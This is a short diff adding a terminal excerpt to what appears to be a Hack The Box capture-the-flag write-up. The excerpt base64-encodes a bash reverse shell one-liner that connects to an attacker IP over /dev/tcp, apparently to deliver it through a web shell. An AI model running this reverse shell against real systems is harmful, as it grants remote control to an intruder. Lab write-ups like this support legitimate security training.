@@ -997,6 +997,19 @@ To summarise what just happened:
 ![[Web Shell Execution Flow.png]]
 
 
+┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
+└─$ echo 'bash -i >& /dev/tcp/10.10.15.227/80 0>&1' | base64 -w0
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMjcvODAgMD4mMQo=                                                                            
+┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
+└─$ 
+
+
+
+
+
+```
+```
+
 <div align="center">
 <br>
 <br>
